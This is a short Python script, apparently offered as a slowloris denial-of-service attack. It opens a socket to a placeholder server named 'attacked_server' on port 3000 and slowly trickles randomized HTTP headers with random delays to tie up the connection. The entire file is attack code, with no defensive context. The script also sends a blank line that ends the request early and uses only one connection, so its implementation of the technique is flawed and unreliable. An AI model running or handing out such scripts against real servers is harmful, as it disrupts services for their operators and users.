import socket
import time
import random

NUM_HEADERS = 100  # Number of headers to send
DELAY_MIN = 0.1    # Minimum delay in seconds between header sends
DELAY_MAX = 0.5    # Maximum delay in seconds between header sends

def slowloris_attack():
    target_host = 'attacked_server'
    target_port = 3000

    # Open socket connection
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_host, target_port))

    # Send initial partial HTTP request headers to keep the connection open
    client.send(b"GET / HTTP/1.1\r\n")
    client.send(b"Host: attacked_server\r\n")
    client.send(b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n")
    client.send(b"Keep-Alive: timeout=20, max=1000\r\n")
    client.send(b"\r\n")

    # Send multiple headers to maintain the connection
    for _ in range(NUM_HEADERS):
        # Vary headers and add randomization
        headers = [
            b"X-a: " + str(random.randint(1, 5000)).encode() + b"\r\n",
            b"Connection: Keep-Alive\r\n"
        ]
        
        # Send headers
        for header in headers:
            try:
                client.send(header)
            except socket.error as e:
                print(f"Error sending header: {e}")
                break
        
        # Introduce a random delay between header sends
        time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))

    client.close()

if __name__ == "__main__":
    slowloris_attack()
